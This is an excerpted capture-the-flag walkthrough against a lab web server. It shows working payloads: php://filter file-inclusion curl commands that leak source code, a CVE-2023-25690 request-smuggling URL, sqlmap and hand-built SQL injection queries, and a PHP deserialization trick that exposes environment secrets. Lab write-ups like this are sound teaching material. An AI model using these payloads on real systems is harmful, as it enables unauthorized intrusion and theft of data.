...
Let's start with some simple recon. Visiting `web.pccc`, we find a really simple index page that simply contains three links.

![A screenshot of web.pccc opened in Firefox. The page is unstyled HTML, with a header reading "Internal Web Alerts Page". There are three listed links: "View Security Alerts", "View Other Events", and "Monitored Hosts".](./imgs/source-index-page.png  "web.pccc Index Page")

1. `View Security Alerts: Events` goes to `http://web.pccc/alerts?t=Alerts`
    - Visiting this page, we see a simple HTML table with some security alerts.
2. `View Other Events: Events` goes to `http://web.pccc/alerts?t=Events`, the same URL as before but with a new `t` GET param value
    - The content is also similar, just different content in the same table (keep this in mind for later)
3. `Monitored Hosts: Hosts` goes to `http://web.pccc/hosts`
...
If we visit `web.pccc/robots.txt`, we get the following warning:

`Warning: include(robots.txt.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 21`

![A screenshot of web.pccc in Firefox, showing the previous warning message.](./imgs/source-warning.png "Include Error for robots.txt")
...
In this case, we can see a `.php` is appended to the file name. In older versions of PHP, we could use a `%00` on the end of the file, but testing this with `http://web.pccc/robots.txt%00` shows that is not possible here and we get a `404 Not Found` error.
...
If you try accessing `web.pccc/index.php?page=index.php`, you'll be greeted with this stange error message:
...
![A screenshot of web.pccc in Firefox, showing the previous warning message.](./imgs/source-filter-fail.png "The Filter Failing to Open")
...
![A screenshot of web.pccc in Firefox, showing the base64-encoded source code.](./imgs/source-base64.png "Receiving base64-encoded Source Code")
...
```bash
curl "http://web.pccc/php:%252F%252Ffilter/read=convert.base64-encode/resource=index" | base64 -d > index.php
```
...
curl "http://web.pccc/php:%252F%252Ffilter/read=convert.base64-encode/resource=index" | base64 -d > index.php
curl "http://web.pccc/php:%252F%252Ffilter/read=convert.base64-encode/resource=alerts" | base64 -d > alerts.php
curl "http://web.pccc/php:%252F%252Ffilter/read=convert.base64-encode/resource=hosts" | base64 -d > hosts.php
curl "http://web.pccc/php:%252F%252Ffilter/read=convert.base64-encode/resource=envHandler" | base64 -d > envHandler.php
```
...
<h1>Internal Web Alerts Page</h1><p>View Security Alerts: <a href='http://web.pccc/alerts?t=Alerts'>Events</a></p><p>View Other Events: <a href='http://web.pccc/alerts?t=Events'>Events</a></p><p>Monitored Hosts: <a href='http://web.pccc/hosts'>Hosts</a></p>
```
...
We can then find a proof of concept for the exploit here: https://github.com/dhmosfunk/CVE-2023-25690-POC. In summary, the HTTP splitting occurs when CRLF characters are included in the rewritten URL; for more details, read through the proof of concept. For this challenge, we want to visit the page `token.php`, so our input will be `http://web.pccc/a%20HTTP/1.1%0D%0AHost:%20localhost%0D%0A%0D%0AGET%20/token.php`. Let's break that down. 

- `http://web.pccc/a%20`: The opening URL and page to request. We just use `a` here to make the rewrite happen correctly, but you could use a valid page name like `alerts.
...
![A screenshot of web.pccc in Firefox, showing the payload entered into the URL. No token is found yet, and the page instead simply gives the same include error as before since a.php does not exist.](./imgs/smuggle-warning.png "No Token on Initial Request")
...
![A screenshot of web.pccc in Firefox after refreshing the page, showing that the smuggling token is now printed at the top of the page.](./imgs/smuggle-token.png "Smuggling Token Obtained")
...
For this token, we will be working with the `web.pccc/alerts` page. As we saw on the home page while retrieving Token 1, the full request is `web.pccc/alerts?t=Alerts` or `web.pccc/alerts?t=Events`, which determines the output of the table on the page. It seems likely this is a table name. Let's try changing that to some other value junk value like `1` or `'`: `web.pccc/alerts?t=Events`. Unfortunately, this simply prints `0 results` and gives no errors or warnings. Let's try `sqlmap` with the maximum level of tests and risk. Enter `no` when asked if you want to reduce the number of requests.

```bash
sqlmap --level=5 --risk=3 -p t -u "http://web.pccc/alerts?t=Alerts"
```
...
Running this query by visiting `http://web.pccc/alerts?t=Alerts,%20(SELECT%201)%20as%20a` will give us the normal results.
...
def getUrl(token):
    return f"http://web.pccc/alerts?t=Alerts,%20(SELECT%20Token%20FROM%20Token%20WHERE%20Token%20LIKE%20%22%25{token}%25%22)%20as%20a"
...
```bash
sqlmap --level 5 --risk 3 -p "t" -u "web.pccc/alerts?t=Alerts" --tamper "./tamper.py"
```
...
The final token will be found at `web.pccc/hosts`, and we will also need the contents of `envHandler.php`. Some good progress can be made without leaking the source code first, but it is likely impossible to complete without.
...
![A screenshot of the terminal showing the PHP script being executed and outputting the base64-encoded serilaized PHP string (the output string can be found as a comment at the end of the PHP code).](./imgs/serial-generate.png "Generating the B64-Encoded Serialized String")
...
The image below shows the result, with the table now being incorrectly populated with environment variables. The host, user, and security token have been replaced with the server's values (e.g., the host is now `web.pccc`). The token is shown under the `Security Token` heading, and is underlined in red.

![A screenshot of the monitored hosts page after importing the string. This time, however, the table contains new contents, listing the PHP ENV variable values instead: "web.pccc", "www-data", and "2bfec67dc41c". The export string has also been replaced with the import string we uploaded.](./imgs/serial-token.png "Retrieving the token")
